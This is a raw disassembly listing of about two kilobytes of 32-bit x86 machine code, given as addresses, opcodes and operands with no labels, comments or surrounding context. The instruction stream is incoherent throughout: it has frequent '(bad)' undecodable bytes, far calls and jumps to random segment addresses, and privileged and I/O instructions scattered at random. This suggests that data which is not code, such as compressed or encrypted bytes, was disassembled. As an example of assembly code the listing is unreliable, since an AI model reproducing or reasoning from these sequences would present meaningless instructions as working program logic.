  41b7f7:	adc    DWORD PTR [eax+0x583b2030],ebx
  41b7fd:	not    BYTE PTR [ebp-0x5715a3b6]
  41b803:	lods   al,BYTE PTR ds:[esi]
  41b804:	ficom  WORD PTR [esi+ecx*8+0x50]
  41b808:	pop    ss
  41b809:	push   0xefe97e3
  41b80e:	call   0x3a0e:0x3f738409
  41b815:	call   0x716e21ad
  41b81a:	push   cs
  41b81b:	xor    BYTE PTR [ebx],0xa6
  41b81e:	or     ecx,DWORD PTR [eax+0x69f25dec]
  41b824:	pop    ecx
  41b825:	(bad)  
  41b826:	mov    dl,BYTE PTR [ebx-0x1a]
  41b829:	mov    al,ds:0x1b5ff4d4
  41b82e:	xchg   esp,ecx
  41b830:	ret    0xc46
  41b833:	(bad)  
  41b834:	call   0x48e5b135
  41b839:	inc    esp
  41b83a:	jl     0x41b8a7
  41b83c:	cmp    al,0x75
  41b83e:	pop    ecx
  41b83f:	inc    ecx
  41b840:	int    0x57
  41b842:	jp     0x41b8b4
  41b844:	inc    edx
  41b845:	js     0x41b88d
  41b847:	enter  0x1f7c,0x94
  41b84b:	push   edi
  41b84c:	pusha  
  41b84d:	xchg   cl,ah
  41b84f:	dec    ebx
  41b850:	shl    DWORD PTR [ebp-0x6ff92d03],0x8e
  41b857:	xchg   ebx,eax
  41b858:	sbb    al,0x1c
  41b85a:	gs ds loope 0x41b873
  41b85e:	push   ecx
  41b85f:	lahf   
  41b860:	cdq    
  41b861:	ficomp WORD PTR [esi-0x6a001425]
  41b867:	sub    BYTE PTR [edi-0x45288bd0],bl
  41b86d:	(bad)  
  41b86e:	push   0xffffffc7
  41b870:	leave  
  41b871:	iret   
  41b872:	jne    0x41b8e1
  41b874:	int3   
  41b875:	xchg   ebp,eax
  41b876:	retf   0xcd6f
  41b879:	add    al,0x7c
  41b87b:	nop
  41b87c:	cmp    BYTE PTR [eax-0x1a],0x29
  41b880:	ins    DWORD PTR es:[edi],dx
  41b881:	(bad)  
  41b883:	mov    edx,0xe03e1c6e
  41b888:	pusha  
  41b889:	jmp    0x9e32:0xe90b2530
  41b890:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b891:	xchg   esi,eax
  41b892:	push   edi
  41b893:	xchg   ecx,eax
  41b894:	stos   DWORD PTR es:[edi],eax
  41b895:	push   0xffffffa9
  41b897:	inc    esp
  41b898:	mov    ch,BYTE PTR [ecx+0x45]
  41b89b:	push   0x55838ae7
  41b8a0:	push   edi
  41b8a1:	jns    0x41b917
  41b8a3:	mov    BYTE PTR [ebx],bl
  41b8a5:	cmp    edx,DWORD PTR [esi-0x1c78ed9a]
  41b8ab:	ror    DWORD PTR [eax+0x8],cl
  41b8ae:	fwait
  41b8af:	in     al,0xb9
  41b8b1:	sub    al,0x7
  41b8b3:	inc    eax
  41b8b4:	lods   eax,DWORD PTR ds:[esi]
  41b8b5:	jmp    0xff93:0xa138f4ef
  41b8bc:	sub    eax,0x6de0109e
  41b8c1:	(bad)  
  41b8c2:	addr16 ja 0x41b87c
  41b8c5:	mov    esp,edx
  41b8c7:	rcr    BYTE PTR [esi],1
  41b8c9:	push   esp
  41b8ca:	ins    BYTE PTR es:[edi],dx
  41b8cb:	(bad)  
  41b8cc:	xchg   edi,eax
  41b8cd:	pop    esp
  41b8ce:	popa   
  41b8cf:	pop    ebp
  41b8d0:	add    edx,DWORD PTR [ecx]
  41b8d2:	dec    ecx
  41b8d3:	lds    eax,FWORD PTR [ebp+0x5e]
  41b8d6:	cmp    BYTE PTR [esi-0xa],al
  41b8d9:	cmp    bl,bh
  41b8db:	jmp    0x9403a8bd
  41b8e0:	frstor [esp+edx*2+0x7bf74be1]
  41b8e7:	and    al,BYTE PTR cs:[eax+0xe]
  41b8eb:	movups xmm5,xmm0
  41b8ee:	jae    0x41b8f3
  41b8f0:	ja     0x41b8be
  41b8f2:	shl    BYTE PTR [edi],1
  41b8f4:	push   ebx
  41b8f5:	add    al,bh
  41b8f7:	aas    
  41b8f8:	sbb    DWORD PTR [eax-0x59],eax
  41b8fb:	repnz pop edx
  41b8fd:	data16 into 
  41b8ff:	or     DWORD PTR [ecx+0x6d],ecx
  41b902:	stc    
  41b903:	(bad)  [edi+ebx*8]
  41b906:	stos   DWORD PTR es:[edi],eax
  41b907:	std    
  41b908:	add    DWORD PTR [ebp+0x5e],ecx
  41b90b:	and    DWORD PTR ds:0xdb02b6e6,0x2aa84d35
  41b915:	rcl    edx,cl
  41b917:	ja     0x41b959
  41b919:	or     al,dl
  41b91b:	shl    DWORD PTR [esi],0x45
  41b91e:	add    al,0x46
  41b920:	xchg   esi,eax
  41b921:	mov    al,0xb8
  41b923:	sbb    ch,BYTE PTR [ebx-0x3]
  41b926:	dec    ebx
  41b927:	int    0xac
  41b929:	sub    eax,0x1991f05d
  41b92e:	mov    ebx,0x3c2deffa
  41b933:	xchg   DWORD PTR [edx-0x635613f0],ebx
  41b939:	dec    eax
  41b93a:	inc    eax
  41b93b:	lds    ebp,FWORD PTR [ebx-0x6535d268]
  41b941:	pop    ds
  41b942:	mov    ds:0xc2e866fc,al
  41b947:	lahf   
  41b948:	out    dx,eax
  41b949:	ss aas 
  41b94b:	or     eax,0xeebf2db7
  41b950:	and    ebx,DWORD PTR [edx]
  41b952:	sub    ebp,0xffffffa1
  41b955:	test   eax,0xb0548679
  41b95a:	in     al,0x18
  41b95c:	lea    ebp,[ecx+0x59]
  41b95f:	mov    bl,cl
  41b961:	test   eax,0x3762892a
  41b967:	fist   DWORD PTR [edx]
  41b969:	sub    BYTE PTR [esi+0x69],ah
  41b96c:	pop    esp
  41b96d:	or     al,BYTE PTR [ecx-0x57f17699]
  41b973:	push   edi
  41b974:	pmuludq mm6,QWORD PTR [edx-0x21396004]
  41b97b:	jns    0x41b8fe
  41b97d:	scas   eax,DWORD PTR es:[di]
  41b97f:	xchg   edi,eax
  41b980:	push   ebx
  41b981:	xchg   esi,eax
  41b982:	sub    DWORD PTR [esi],eax
  41b984:	sti    
  41b985:	les    ecx,FWORD PTR [eax+0x69d6d5ec]
  41b98b:	call   0xb2de1624
  41b990:	data16 (bad) 
  41b992:	loop   0x41b97f
  41b994:	inc    edi
  41b995:	les    edx,FWORD PTR [ecx+0x11]
  41b998:	dec    edi
  41b999:	sbb    edx,DWORD PTR [esi-0x6f]
  41b99c:	add    ah,BYTE PTR es:[esi-0x9]
  41b9a0:	add    eax,0x249e4b98
  41b9a5:	adc    al,0xe0
  41b9a7:	int3   
  41b9a8:	fwait
  41b9a9:	mov    edi,0xbc0a75ae
  41b9ae:	shr    DWORD PTR [ecx],1
  41b9b0:	sahf   
  41b9b1:	data16 cmp bl,BYTE PTR [esi-0x51893bcd]
  41b9b8:	ret    
  41b9b9:	leave  
  41b9ba:	sbb    BYTE PTR [ebp+0x32835b76],al
  41b9c0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b9c1:	inc    ecx
  41b9c2:	leave  
  41b9c3:	jno    0x41b985
  41b9c5:	rcl    BYTE PTR [esp+eax*1],cl
  41b9c8:	pop    edi
  41b9c9:	mov    dl,BYTE PTR [edx-0x784ed30d]
  41b9cf:	into   
  41b9d0:	add    al,0xb0
  41b9d2:	leave  
  41b9d3:	and    ah,BYTE PTR [esi-0x1c]
  41b9d6:	jbe    0x41b9a7
  41b9d8:	test   ah,dl
  41b9da:	icebp  
  41b9db:	cmp    ebx,esp
  41b9dd:	test   ebx,esi
  41b9df:	jno    0x41b9c3
  41b9e1:	push   edi
  41b9e2:	outs   dx,DWORD PTR ds:[esi]
  41b9e3:	pop    ebp
  41b9e4:	and    cl,BYTE PTR [ebx]
  41b9e6:	scas   eax,DWORD PTR es:[edi]
  41b9e7:	sub    DWORD PTR [edi],0xffffffb8
  41b9ea:	xor    dh,BYTE PTR ds:0x73129b35
  41b9f0:	inc    ebx
  41b9f1:	mov    ebx,0x42d879c7
  41b9f6:	inc    esi
  41b9f7:	jo     0x41b995
  41b9f9:	leave  
  41b9fa:	aad    0x8c
  41b9fc:	xchg   DWORD PTR ds:0x3def1157,ebx
  41ba02:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ba03:	bound  esp,QWORD PTR [eax+0x66]
  41ba06:	sahf   
  41ba07:	iret   
  41ba08:	push   ss
  41ba09:	add    ebp,DWORD PTR [ecx-0x53c1d66c]
  41ba0f:	xor    eax,0xda45f178
  41ba14:	sbb    eax,0x1cb2c05a
  41ba19:	test   eax,0x7ad317e5
  41ba1e:	mov    dh,BYTE PTR [edx+0x25]
  41ba21:	inc    ebp
  41ba22:	dec    ecx
  41ba23:	cmp    DWORD PTR [eax],ebx
  41ba25:	jg     0x41ba91
  41ba27:	(bad)  
  41ba29:	bound  esi,QWORD PTR [edx]
  41ba2b:	xor    al,0xe2
  41ba2d:	xchg   BYTE PTR [ecx-0x54],dl
  41ba30:	nop
  41ba31:	xchg   ebp,eax
  41ba32:	adc    DWORD PTR [edx],ebx
  41ba34:	mov    dl,0xa4
  41ba36:	inc    edx
  41ba37:	ss and eax,0x735734af
  41ba3d:	inc    ebp
  41ba3e:	cmp    dl,ch
  41ba40:	sub    ch,BYTE PTR [ebp-0xa0c615a]
  41ba46:	gs out dx,eax
  41ba48:	int    0x43
  41ba4a:	xor    ebp,edi
  41ba4c:	inc    ebp
  41ba4d:	adc    eax,0xc3b5e652
  41ba52:	jmp    0x67f2c0f9
  41ba57:	inc    edx
  41ba58:	loopne 0x41baba
  41ba5a:	pop    eax
  41ba5b:	mov    ebp,0xbbcbdee6
  41ba60:	idiv   ecx
  41ba62:	or     ecx,DWORD PTR [edx+ecx*2+0x69]
  41ba66:	sbb    al,0x55
  41ba68:	mov    BYTE PTR [esi-0x3147d30c],dh
  41ba6e:	popa   
  41ba6f:	pop    ebx
  41ba70:	jmp    0x53dc:0x61e4b8fc
  41ba77:	cmp    al,0x4a
  41ba79:	mov    BYTE PTR ds:0xbac8818a,0x7c
  41ba80:	sbb    al,bl
  41ba82:	aam    0xa7
  41ba84:	mov    dl,0x10
  41ba86:	mov    dh,ah
  41ba88:	adc    BYTE PTR [edx-0x180b5451],bh
  41ba8e:	out    0x77,al
  41ba90:	mov    ?,WORD PTR [ebp+0xcb40b0]
  41ba96:	(bad)  [ebx]
  41ba98:	(bad)  
  41ba99:	adc    ch,BYTE PTR [edi+0x4b7be665]
  41ba9f:	loope  0x41baba
  41baa1:	test   eax,0x4183da20
  41baa6:	adc    DWORD PTR [ebp+0x46],ebx
  41baa9:	stc    
  41baaa:	dec    ecx
  41baab:	(bad)  
  41baac:	sbb    al,BYTE PTR [esi+esi*2+0x1f]
  41bab0:	ins    DWORD PTR es:[edi],dx
  41bab1:	and    al,0x31
  41bab3:	sar    BYTE PTR [ecx],cl
  41bab5:	shl    ah,0x4d
  41bab8:	dec    ecx
  41bab9:	lahf   
  41baba:	sub    DWORD PTR [ecx-0x173fa9ff],edi
  41bac0:	and    eax,0xa8f50a93
  41bac5:	inc    ecx
  41bac6:	popf   
  41bac7:	cmp    eax,0xc30b9609
  41bacc:	or     bh,bh
  41bace:	fimul  DWORD PTR [esi]
  41bad0:	inc    esi
  41bad1:	call   0x307e:0x1d226f82
  41bad8:	mov    ebx,DWORD PTR [ebx]
  41bada:	cmp    BYTE PTR [edx+0x72aa3cc2],0xb
  41bae1:	jmp    0x347:0x75ffd270
  41bae8:	out    dx,eax
  41bae9:	aaa    
  41baea:	xchg   BYTE PTR [ebx],dl
  41baec:	jno    0x41baaf
  41baee:	jns    0x41bb23
  41baf0:	fxch   st(6)
  41baf2:	sbb    eax,0xc4f9b704
  41baf7:	(bad)  [edx-0x34dc4dae]
  41bafd:	mov    bh,0xd
  41baff:	retf   0x659
  41bb02:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41bb03:	xchg   edx,eax
  41bb04:	ret    0xd18b
  41bb07:	stos   BYTE PTR es:[edi],al
  41bb08:	cdq    
  41bb09:	in     al,0x81
  41bb0b:	push   DWORD PTR [esi]
  41bb0d:	(bad)  
  41bb0e:	jne    0x41ba9b
  41bb10:	ja     0x41bb6c
  41bb12:	inc    esi
  41bb13:	jg     0x41ba96
  41bb15:	adc    eax,0x9f00cfc
  41bb1a:	pop    eax
  41bb1b:	or     esp,DWORD PTR [ebp+0xd366591]
  41bb21:	loopne 0x41bacd
  41bb23:	test   al,0x2c
  41bb25:	shr    DWORD PTR [ebx-0x72a6cf2b],cl
  41bb2b:	dec    ebp
  41bb2c:	pop    esp
  41bb2d:	call   0x8433ac99
  41bb32:	aad    0x40
  41bb34:	shl    DWORD PTR [ebx-0xcc18316],0xfc
  41bb3b:	sub    eax,0x2343ee3b
  41bb40:	fcmovb st,st(4)
  41bb42:	pop    ecx
  41bb43:	cmp    DWORD PTR [edx+0x47],edi
  41bb46:	jge    0x41bb8f
  41bb48:	inc    BYTE PTR [esi+0x4c]
  41bb4b:	sub    DWORD PTR [eax],esi
  41bb4d:	jae    0x41bb3c
  41bb4f:	cld    
  41bb50:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41bb51:	ja     0x41bb0d
  41bb53:	aas    
  41bb54:	call   0x6e77:0xcbd9aef0
  41bb5b:	sar    esp,cl
  41bb5d:	ss int3 
  41bb5f:	inc    edi
  41bb60:	inc    ebx
  41bb61:	xchg   esp,eax
  41bb62:	mov    cl,0x59
  41bb64:	or     BYTE PTR [esi-0x3eb838db],0x2e
  41bb6b:	jl     0x41bbb1
  41bb6d:	push   cs
  41bb6e:	mov    ecx,0x63283cf3
  41bb73:	push   es
  41bb74:	push   edi
  41bb75:	call   0x6d361383
  41bb7a:	xor    cl,BYTE PTR [ecx]
  41bb7c:	addr16 dec edi
  41bb7e:	retf   0xe405
  41bb81:	pop    es
  41bb82:	fimul  WORD PTR [ebp+0x3e]
  41bb85:	mov    bh,cl
  41bb87:	mov    DWORD PTR [ecx+0x73e3cbe5],esi
  41bb8d:	mov    edi,0x5f99e530
  41bb92:	call   0x2d44b6df
  41bb97:	or     DWORD PTR [ebp+ebx*8-0x4c],edi
  41bb9b:	mov    edx,0xe3bf4d08
  41bba0:	pop    ebx
  41bba1:	imul   edx,DWORD PTR [edx],0xf2804ad4
  41bba7:	lods   al,BYTE PTR ds:[esi]
  41bba8:	lahf   
  41bba9:	daa    
  41bbaa:	hlt    
  41bbab:	jecxz  0x41bbe5
  41bbad:	bound  edx,QWORD PTR [eax+0x3f]
  41bbb0:	mov    bh,0x81
  41bbb2:	mov    ds:0x351b060c,al
  41bbb7:	enter  0x35a5,0x4e
  41bbbb:	mov    ah,0x3
  41bbbd:	call   0xaa26:0x3a82fd2f
  41bbc4:	in     al,dx
  41bbc5:	dec    ecx
  41bbc6:	fild   QWORD PTR [ecx-0x4065c5c6]
  41bbcc:	mov    dh,0x91
  41bbce:	jmp    0x27be:0x5d8e8868
  41bbd5:	out    0x11,al
  41bbd7:	je     0x4614d74e
  41bbdd:	pop    ss
  41bbde:	pop    edi
  41bbdf:	call   0x42b0:0x21f4dfb0
  41bbe6:	xor    edi,edi
  41bbe8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41bbe9:	out    dx,al
  41bbea:	es xchg ebx,eax
  41bbec:	or     ecx,DWORD PTR ds:0x6eded9f6
  41bbf2:	mov    eax,0xf7fb5263
  41bbf7:	test   al,0x4f
  41bbf9:	pop    edx
  41bbfa:	adc    edx,DWORD PTR [ebx]
  41bbfc:	mov    DWORD PTR [ecx*8+0x6f4db5ff],esi
  41bc03:	jbe    0x41bba2
  41bc05:	mov    al,0xa1
  41bc07:	in     al,dx
  41bc08:	adc    BYTE PTR [ecx-0x62],cl
  41bc0b:	cmp    ebx,DWORD PTR [ebx+0x10]
  41bc0e:	or     DWORD PTR [ebx],ebx
  41bc10:	dec    edi
  41bc11:	hlt    
  41bc12:	iret   
  41bc13:	fisttp QWORD PTR [ebx+0x190049a4]
  41bc19:	and    eax,0xa680c31b
  41bc1e:	push   ecx
  41bc1f:	leave  
  41bc20:	mov    ds:0x3197fcb1,eax
  41bc25:	mov    WORD PTR [eax],cs
  41bc27:	adc    DWORD PTR [eax+0xf],0xffffff8a
  41bc2b:	enter  0x9004,0x1d
  41bc2f:	sbb    edi,ebp
  41bc31:	mov    ch,0xce
  41bc33:	scas   al,BYTE PTR es:[edi]
  41bc34:	ins    DWORD PTR es:[edi],dx
  41bc35:	popa   
  41bc36:	cdq    
  41bc37:	call   0x6d2d:0xc88f2cc4
  41bc3e:	in     eax,dx
  41bc3f:	push   cs
  41bc40:	or     eax,0x5beab730
  41bc45:	fmul   DWORD PTR [eax]
  41bc47:	into   
  41bc48:	cmp    eax,0xa319bff4
  41bc4d:	aam    0x2
  41bc4f:	test   esi,ebp
  41bc51:	lods   al,BYTE PTR ds:[esi]
  41bc52:	or     DWORD PTR [eax+0x1f],0x2c6ee99c
  41bc59:	je     0x41bcc8
  41bc5b:	jg     0x41bc4a
  41bc5d:	mov    bl,0x4
  41bc5f:	imul   esi,DWORD PTR [eax+0x58cd9310],0xffffff8e
  41bc66:	inc    esp
  41bc67:	iret   
  41bc68:	shr    DWORD PTR [edi-0xc3f99c0],cl
  41bc6e:	dec    ebp
  41bc6f:	std    
  41bc70:	pop    ebx
  41bc71:	loopne 0x41bc5c
  41bc73:	mov    ?,WORD PTR [edi+0x50]
  41bc76:	fld    st(3)
  41bc78:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41bc79:	or     cl,dh
  41bc7b:	mov    dh,al
  41bc7d:	retf   
  41bc7e:	jb     0x41bc81
  41bc80:	out    0x77,eax
  41bc82:	mov    ds:0x3e6307b2,al
  41bc87:	ins    DWORD PTR es:[edi],dx
  41bc88:	addr16 mov al,ds:0x8816
  41bc8c:	xor    DWORD PTR [eax],edi
  41bc8e:	cmp    BYTE PTR [edx+0x75],dl
  41bc91:	push   ds
  41bc92:	mov    edx,0x2274bd6a
  41bc97:	and    eax,0x4f66e431
  41bc9c:	add    al,0x46
  41bc9e:	mov    ebp,0x3be0b77c
  41bca3:	push   ds
  41bca4:	popf   
  41bca5:	(bad)  
  41bca6:	call   0x78510862
  41bcab:	mov    edi,0x875302e2
  41bcb0:	push   esi
  41bcb1:	add    BYTE PTR [eax],ch
  41bcb3:	dec    esi
  41bcb4:	data16 xor bl,BYTE PTR [ebx+eax*4-0x7c]
  41bcb9:	(bad)  
  41bcba:	mov    ebp,0xc149ec63
  41bcbf:	jb     0x41bc9b
  41bcc1:	xchg   DWORD PTR [edx+0x40567bb],ebp
  41bcc7:	sub    ebx,DWORD PTR [edi+0x2d6a7462]
  41bccd:	icebp  
  41bcce:	jno    0x41bd2d
  41bcd0:	sub    ch,BYTE PTR [ebx+0x25]
  41bcd3:	cmp    DWORD PTR [ebx],esp
  41bcd5:	xor    eax,DWORD PTR [esi]
  41bcd7:	clc    
  41bcd8:	cmp    eax,0xe2f69b5c
  41bcdd:	jmp    0xcbc209e2
  41bce2:	push   0xffffffdf
  41bce4:	sub    eax,0x17106503
  41bce9:	xor    DWORD PTR [ecx],ebp
  41bceb:	ja     0x41bca1
  41bced:	mov    al,ds:0xdede0be1
  41bcf2:	mov    ch,0x3
  41bcf4:	mov    al,BYTE PTR [esi]
  41bcf6:	add    ebp,edx
  41bcf8:	pop    esi
  41bcf9:	ins    DWORD PTR es:[edi],dx
  41bcfa:	jmp    0xcb882f7a
  41bcff:	xor    al,0x45
  41bd01:	(bad)  
  41bd02:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bd03:	and    DWORD PTR [edx-0x8],ebx
  41bd06:	pusha  
  41bd07:	jae    0x41bd73
  41bd09:	lea    ebp,[ecx+0x62fd64ec]
  41bd0f:	(bad)  
  41bd10:	mov    bh,0xce
  41bd12:	inc    ecx
  41bd13:	(bad)  
  41bd14:	fcmovnb st,st(0)
  41bd16:	adc    al,0xa7
  41bd18:	out    dx,eax
  41bd19:	test   ch,cl
  41bd1b:	push   edx
  41bd1c:	pop    ebx
  41bd1d:	xchg   edx,eax
  41bd1e:	xchg   esp,eax
  41bd1f:	gs pusha 
  41bd21:	repz pop esp
  41bd23:	daa    
  41bd24:	inc    esp
  41bd25:	pop    ss
  41bd26:	cmc    
  41bd27:	dec    esi
  41bd28:	cdq    
  41bd29:	sbb    ah,BYTE PTR [esi]
  41bd2b:	mov    DWORD PTR [esi+0x3],ecx
  41bd2e:	sbb    DWORD PTR [esi],0xffffffcc
  41bd31:	mov    eax,ds:0xb221a035
  41bd36:	leave  
  41bd37:	mov    ds:0x6d67e37d,eax
  41bd3c:	leave  
  41bd3d:	cdq    
  41bd3e:	xlat   BYTE PTR ds:[ebx]
  41bd3f:	jae    0x41bd43
  41bd41:	imul   edi,DWORD PTR [esi-0x3d],0xa
  41bd45:	add    DWORD PTR [eax],0xfffffff2
  41bd48:	hlt    
  41bd49:	adc    al,0x97
  41bd4b:	dec    esp
  41bd4c:	call   DWORD PTR [ebx+0x4a]
  41bd4f:	adc    eax,0xa5a1fbff
  41bd54:	adc    dh,BYTE PTR [edx+0x0]
  41bd57:	jmp    FWORD PTR [edx+0x53]
  41bd5a:	jge    0x41bd1a
  41bd5c:	hlt    
  41bd5d:	mov    edi,0x1acd5824
  41bd62:	imul   DWORD PTR [edi-0x400b2d03]
  41bd68:	and    DWORD PTR [edx+edx*1+0x29],0x20
  41bd6d:	adc    eax,0x66c60daf
  41bd72:	cmp    esi,esp
  41bd74:	shr    BYTE PTR [edx+esi*2],1
  41bd77:	sub    dh,BYTE PTR [eax-0x51badf72]
  41bd7d:	mov    dl,0xc9
  41bd7f:	push   ebx
  41bd80:	inc    edx
  41bd81:	test   al,0xe6
  41bd83:	push   esi
  41bd84:	sub    bl,BYTE PTR [ebp-0x5]
  41bd87:	cmp    al,0xeb
  41bd89:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41bd8a:	xchg   ecx,eax
  41bd8b:	push   es
  41bd8c:	mov    cl,0xd
  41bd8e:	mov    ch,BYTE PTR [ebx+0x5c]
  41bd91:	xchg   ecx,eax
  41bd92:	ret    0x7309
  41bd95:	arpl   si,ax
  41bd97:	lahf   
  41bd98:	jbe    0x41bdfe
  41bd9a:	mov    ecx,0x4677a44c
  41bd9f:	jmp    0x3836:0x325e667e
  41bda6:	aas    
  41bda7:	sbb    al,BYTE PTR [ebx+eiz*4]
  41bdaa:	ret    
  41bdab:	sbb    BYTE PTR [eax+0x18],0x87
  41bdaf:	icebp  
  41bdb0:	push   esp
  41bdb1:	mov    esi,0x7f370c8c
  41bdb6:	push   ebx
  41bdb7:	jmp    0xa681fe2
  41bdbc:	sbb    eax,0xa4e93d66
  41bdc1:	loope  0x41bd6c
  41bdc3:	add    DWORD PTR [edx],edi
  41bdc5:	call   0xb845:0x7501239a
  41bdcc:	push   edx
  41bdcd:	(bad)  
  41bdce:	cmp    DWORD PTR [ecx-0x58],0x3c
  41bdd2:	sub    eax,0x3deff078
  41bdd7:	xchg   BYTE PTR [edx],ch
  41bdd9:	xor    eax,0x1b6cfe4b
  41bdde:	or     ch,BYTE PTR [ebx+0x67]
  41bde1:	sahf   
  41bde2:	lahf   
  41bde3:	xor    eax,0xca0b9ee8
  41bde8:	fmul   DWORD PTR [ebx+0x2f]
  41bdeb:	mov    ds:0x41986d89,eax
  41bdf0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41bdf1:	cmp    al,0x26
  41bdf3:	ins    DWORD PTR es:[edi],dx
  41bdf4:	imul   ecx,DWORD PTR [eax-0x4414f9f2],0xffffffbe
  41bdfb:	arpl   ax,ax
  41bdfd:	adc    al,0x2a
  41bdff:	in     eax,dx
  41be00:	stos   BYTE PTR es:[edi],al
  41be01:	add    DWORD PTR [ecx+esi*2+0x6de5af7f],ebp
  41be08:	(bad)  
  41be09:	push   esi
  41be0a:	jmp    0xe611707b
  41be0f:	aam    0xd7
  41be11:	cmp    edx,esi
  41be13:	inc    ebp
  41be14:	mov    ebp,0xed307b26
  41be19:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41be1a:	lods   eax,DWORD PTR ds:[esi]
  41be1b:	lods   al,BYTE PTR ds:[esi]
  41be1c:	inc    ecx
  41be1d:	pop    edi
  41be1e:	inc    ebp
  41be1f:	lods   eax,DWORD PTR ds:[esi]
  41be20:	add    al,0xc2
  41be22:	mov    al,0x4d
  41be24:	repnz xor DWORD PTR [ebp+0x33],ebp
  41be28:	pop    esi
  41be29:	xchg   esi,eax
  41be2a:	inc    edx
  41be2b:	(bad)  
  41be2c:	cli    
  41be2d:	mov    dh,0x5a
  41be2f:	cmp    al,0xd6
  41be31:	cmc    
  41be32:	fimul  DWORD PTR [edi+eiz*2-0x45ce03db]
  41be39:	mov    esi,0x9e694381
  41be3e:	rcr    DWORD PTR ds:0xa25e6971,0xd9
  41be45:	or     ecx,esi
  41be47:	sub    esi,edi
  41be49:	cld    
  41be4a:	mov    BYTE PTR [eax+0x7839d520],al
  41be50:	fcom   DWORD PTR cs:[ecx+0x3dbdcc0b]
  41be57:	adc    DWORD PTR [ecx+0x38],esp
  41be5a:	mov    bh,0x69
  41be5c:	inc    ecx
  41be5d:	jge    0x41bed0
  41be5f:	mov    ah,0x6c
  41be61:	push   ebp
  41be62:	jnp    0x41be12
  41be64:	xchg   BYTE PTR [ecx],ch
  41be66:	mov    edi,0xe7673aa4
  41be6b:	stc    
  41be6c:	fist   DWORD PTR [edi+0x161cf9f]
  41be72:	dec    eax
  41be73:	or     al,0xa7
  41be75:	xchg   edx,eax
  41be76:	xor    BYTE PTR [esi+0x72d904d7],cl
  41be7c:	push   esi
  41be7d:	xacquire xchg BYTE PTR [edi+0x70],ch
  41be81:	mov    ds:0xd2af6cee,eax
  41be86:	aad    0xd3
  41be88:	cmp    eax,0x6849045a
  41be8d:	or     dl,BYTE PTR [ebx]
  41be8f:	xchg   edx,ebp
  41be91:	and    bl,ch
  41be93:	push   esi
  41be94:	sbb    eax,0x57148a31
  41be99:	push   0x68187086
  41be9e:	xchg   BYTE PTR [eax],cl
  41bea0:	outs   dx,BYTE PTR ds:[esi]
  41bea1:	repnz test DWORD PTR [edx],0x67a289e
  41bea8:	add    cl,BYTE PTR [eax]
  41beaa:	(bad)  
  41beab:	das    
  41beac:	les    ecx,FWORD PTR [esi+0x75]
  41beaf:	mov    cs,WORD PTR [ecx-0x709739b5]
  41beb5:	es sub al,0x9f
  41beb8:	jnp    0x41bf20
  41beba:	outs   dx,BYTE PTR ds:[esi]
  41bebb:	pusha  
  41bebc:	bound  edi,QWORD PTR [ebx-0x77]
  41bebf:	fild   DWORD PTR [edx]
  41bec1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41bec2:	mov    dl,0xe9
  41bec4:	in     al,0xa7
  41bec6:	and    DWORD PTR [eax-0x34cc8e0b],esi
  41becc:	(bad)  
  41becd:	pop    ds
  41bece:	and    eax,0xd758e5c3
  41bed3:	sbb    al,0x74
  41bed5:	mov    ebx,0xe2b3197e
  41beda:	lods   eax,DWORD PTR ds:[esi]
  41bedb:	xor    esi,ecx
  41bedd:	add    eax,0x5ae14a5a
  41bee2:	dec    edx
  41bee3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41bee4:	ds (bad) 
  41bee7:	push   ecx
  41bee8:	aad    0x7c
  41beea:	cli    
  41beeb:	and    DWORD PTR [esi+0x557f391c],eax
  41bef1:	push   es
  41bef2:	sub    eax,0x81b63e43
  41bef7:	xchg   esi,eax
  41bef8:	pop    ebx
  41bef9:	mov    cl,0x71
  41befb:	hlt    
  41befc:	(bad)  
  41befd:	jp     0x41bf2d
  41beff:	xlat   BYTE PTR ds:[ebx]
  41bf00:	bound  edx,QWORD PTR [ebx]
  41bf02:	xchg   ebx,eax
  41bf03:	add    esi,DWORD PTR [ebx+edx*1+0x5d]
  41bf07:	jno    0x41befd
  41bf09:	call   0x5efa:0x7052522c
  41bf10:	and    ah,BYTE PTR [edi+edi*4-0x28]
  41bf14:	popf   
  41bf15:	mov    dh,0xbc
  41bf17:	add    esi,DWORD PTR [esi-0x28a095bf]
  41bf1d:	add    DWORD PTR [esi-0x20],0x8b1b97e4
  41bf24:	clc    
  41bf25:	sub    ebp,DWORD PTR [eax+0x72]
  41bf28:	enter  0xe152,0x90
  41bf2c:	and    al,0xd9
  41bf2e:	rcr    DWORD PTR [ecx+ecx*4+0x5f],1
  41bf32:	out    0xb8,eax
  41bf34:	dec    edx
  41bf35:	iret   
  41bf36:	sbb    edi,edx
  41bf38:	mov    cl,0x4d
  41bf3a:	scas   al,BYTE PTR es:[edi]
  41bf3b:	jg     0x41bf26
  41bf3d:	popf   
  41bf3e:	add    esi,DWORD PTR [ebp+eax*2-0x43]
  41bf42:	fsub   DWORD PTR [ebp+0x71]
  41bf45:	sbb    esp,DWORD PTR [esi]
  41bf47:	mov    esi,0xfc1dec56
  41bf4c:	and    BYTE PTR [edi],dl
  41bf4e:	es (bad) 
  41bf50:	ficomp WORD PTR [ebp+edi*8+0x7edacacf]
  41bf57:	inc    ecx
  41bf58:	jecxz  0x41bf83
  41bf5a:	div    esp
  41bf5c:	push   ecx
  41bf5d:	(bad)  
  41bf5e:	push   ds
  41bf5f:	aas    
  41bf60:	pop    ds
  41bf61:	jg     0x41bf8f
  41bf63:	scas   eax,DWORD PTR es:[edi]
  41bf64:	repnz sti 
  41bf66:	xor    al,0x4d
  41bf68:	outs   dx,DWORD PTR ds:[esi]
  41bf69:	sbb    edx,0xffffffe1
  41bf6c:	mov    ebp,DWORD PTR [ebx]
  41bf6e:	and    al,0xb
  41bf70:	add    al,0x94
  41bf72:	jecxz  0x41bfc4
  41bf74:	jno    0x41bf9f
  41bf76:	xor    eax,0xe9c26075
